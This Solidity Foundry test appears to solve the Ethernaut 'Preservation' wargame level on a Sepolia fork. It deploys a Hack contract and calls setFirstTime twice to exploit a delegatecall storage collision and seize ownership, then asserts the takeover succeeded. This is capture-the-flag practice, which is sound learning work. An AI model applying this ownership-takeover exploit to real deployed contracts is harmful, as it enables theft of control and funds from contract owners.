//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Preservation, Hack} from "../src/level16.sol";

contract level16Test is Test {
    Preservation target;

    function setUp() public {
        vm.createSelectFork("SEPOLIA");
        address instanceAddress = vm.envAddress("INSTANCE_AD");
        target = Preservation(instanceAddress);
    }

    function testSolvesLeve16() public {
        address hacker = makeAddr("hacker");
        address ownerBefore = target.owner();
        console.log("Owner before: ", ownerBefore);
        vm.startPrank(hacker, hacker);
        Hack hackContract = new Hack();
        target.setFirstTime(uint256(uint160(address(hackContract))));
        target.setFirstTime(uint256(uint160(hacker)));
        vm.stopPrank();
        address ownerAfter = target.owner();
        console.log("Owner after: ", ownerAfter);
        assertEq(target.owner(), hacker);
    }
}
//INSTANCE_AD=0xFebBd3682FF44A5A9B7af1EBE8B472b40708acB7 forge test --mt testSolvesLeve16 -vvv
